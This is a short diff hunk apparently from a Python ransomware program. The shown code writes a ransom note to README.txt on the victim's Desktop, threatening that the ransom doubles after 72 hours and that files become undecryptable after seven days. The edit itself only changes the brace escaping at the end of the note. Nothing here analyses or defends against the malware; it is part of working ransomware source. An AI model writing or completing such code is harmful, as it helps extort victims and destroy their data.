@@ -374,7 +374,7 @@ To get them back, you need to follow the instructions below.
 - If you don't pay within 72 hours, the price will double.
 - If you don't pay within 7 days, all your files will no longer be decryptable!!!
 
-Don't Cry =}"""
+Don't Cry =}}"""
     file_path = os.path.join(os.environ["USERPROFILE"], r"Desktop\README.txt")
     with open(file_path, "w") as f:
         f.write(msg)
